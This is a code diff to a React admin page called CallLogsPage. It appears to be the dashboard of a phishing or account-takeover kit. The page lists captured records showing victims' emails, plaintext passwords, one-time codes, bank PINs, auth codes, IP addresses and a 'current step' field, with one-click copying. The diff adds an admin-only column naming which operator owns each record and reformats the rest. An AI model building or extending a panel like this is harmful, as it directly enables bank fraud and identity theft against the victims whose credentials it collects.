@@ -241,7 +241,7 @@ function CallLogsPage() {
   }
   return (
     <Fragment>
-      <Seo title={"Call-logs"} />
+      <Seo title={"logs"} />
       <Success
         isOpen={open}
         title={"Copied!"}
@@ -252,7 +252,10 @@ function CallLogsPage() {
         <Col xl={12}>
           <Card className="custom-card">
             <Card.Header className="justify-content-between">
-              <Card.Title className="flex gap-2"><h1>View Your Logs</h1> <span className="text-blue-500">{totalAccounts}</span></Card.Title>
+              <Card.Title className="flex gap-2">
+                <h1>View Logs</h1>{" "}
+                <span className="text-blue-500">{totalAccounts}</span>
+              </Card.Title>
               <div className="d-flex flex-wrap gap-2">
                 <div className="flex justify-between gap-2">
                   <input
@@ -335,6 +338,7 @@ function CallLogsPage() {
                           onChange={toggleSelectAll}
                         />
                       </th>
+                      {user?.role == "admin" && <th>User Name</th>}
                       <th>Email</th>
                       <th>Password</th>
                       <th>OTP</th>
@@ -350,27 +354,51 @@ function CallLogsPage() {
                   <tbody>
                     {accounts
                       ?.slice()
-                      .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
+                      .sort(
+                        (a: any, b: any) =>
+                          new Date(b.createdAt).getTime() -
+                          new Date(a.createdAt).getTime()
+                      )
                       .map((account: any) => (
                         <tr
                           key={account._id}
                           className={`
-                            ${completedAccounts.includes(account._id) ? "text-green-500" : ""} 
-                            ${inCompleteAccounts.includes(account._id) ? "text-red-500" : ""} 
-                            ${locked.includes(account._id) ? "text-purple-500" : ""}
+                            ${
+                              completedAccounts.includes(account._id)
+                                ? "text-green-500"
+                                : ""
+                            } 
+                            ${
+                              inCompleteAccounts.includes(account._id)
+                                ? "text-red-500"
+                                : ""
+                            } 
+                            ${
+                              locked.includes(account._id)
+                                ? "text-purple-500"
+                                : ""
+                            }
                           `}
                         >
                           <td>
                             <input
                               type="checkbox"
-                              checked={selectedAccounts.includes(account._id)}
-                              onChange={() => toggleSelectAccount(account._id, account)}
+                              checked={selectedAccounts.includes(account?._id)}
+                              onChange={() =>
+                                toggleSelectAccount(account?._id, account)
+                              }
                             />
                           </td>
+                          {user?.role == "admin" && (
+                            <td>{account?.userId?.userName}</td>
+                          )}
                           <td>
                             <div className="d-flex">
-                              <div className="ms-2" onClick={() => copyToClipboard(account.email)}>
-                                <p className="fs-12 mb-0">{account.email}</p>
+                              <div
+                                className="ms-2"
+                                onClick={() => copyToClipboard(account?.email)}
+                              >
+                                <p className="fs-12 mb-0">{account?.email}</p>
                               </div>
                             </div>
                           </td>
@@ -378,15 +406,23 @@ function CallLogsPage() {
                             {account.password}
                           </td>
                           <td onClick={() => copyToClipboard(account.otp)}>
-                            <span className={`bg-${account?.status?.toLowerCase()}-transparent`}>
+                            <span
+                              className={`bg-${account?.status?.toLowerCase()}-transparent`}
+                            >
                               {account.otp}
                             </span>
                           </td>
-                          <td onClick={() => copyToClipboard(account.currentStep)}>
-                            <span className="fw-semibold fs-13">{account.currentStep}</span>
+                          <td
+                            onClick={() => copyToClipboard(account.currentStep)}
+                          >
+                            <span className="fw-semibold fs-13">
+                              {account.currentStep}
+                            </span>
                           </td>
                           <td onClick={() => copyToClipboard(account.bankPin)}>
-                            <span className="fw-semibold fs-13">{account.bankPin}</span>
+                            <span className="fw-semibold fs-13">
+                              {account.bankPin}
+                            </span>
                           </td>
                           <td>
                             <img
@@ -398,13 +434,21 @@ function CallLogsPage() {
                             />
                           </td>
                           <td onClick={() => copyToClipboard(account.authCode)}>
-                            <span className="fw-semibold fs-13">{account.authCode}</span>
+                            <span className="fw-semibold fs-13">
+                              {account.authCode}
+                            </span>
                           </td>
-                          <td onClick={() => copyToClipboard(account?.location?.ipAddress)}>
+                          <td
+                            onClick={() =>
+                              copyToClipboard(account?.location?.ipAddress)
+                            }
+                          >
                             {account?.location?.ipAddress}
                           </td>
                           <td>
-                            {moment(account?.createdAt).format("ddd, MMM DD, YYYY, hh:mm A")}
+                            {moment(account?.createdAt).format(
+                              "ddd, MMM DD, YYYY, hh:mm A"
+                            )}
                           </td>
                         </tr>
                       ))}
@@ -473,14 +517,9 @@ function CallLogsPage() {
                           onChange={toggleSelectAll}
                         />
                       </th>
-                      <th>Email</th>
-                      <th>Password</th>
-                      <th>Otp</th>
-                      <th>Bank Pin</th>
                       <th>Country Flag</th>
                       <th>IP Address</th>
                       <th>Date</th>
-                      {/* <th>Action</th> */}
                     </tr>
                   </thead>
                   <tbody>
@@ -516,31 +555,6 @@ function CallLogsPage() {
                                 toggleSelectAccount(account._id, account)
                               }
                             />
-                          </td>
-                          <td>
-                            <div className="d-flex">
-                              <div
-                                className="ms-2"
-                                onClick={() => copyToClipboard(account.email)}
-                              >
-                                <p className="fs-12 mb-0">{account.email}</p>
-                              </div>
-                            </div>
-                          </td>
-                          <td onClick={() => copyToClipboard(account.password)}>
-                            {account.password}
-                          </td>
-                          <td onClick={() => copyToClipboard(account.otp)}>
-                            <span
-                              className={`bg-${account?.status?.toLowerCase()}-transparent`}
-                            >
-                              {account.otp}
-                            </span>
-                          </td>
-                          <td onClick={() => copyToClipboard(account.bankPin)}>
-                            <span className="fw-semibold fs-13">
-                              {account.bankPin}
-                            </span>
                           </td>
                           <td>
                             <img
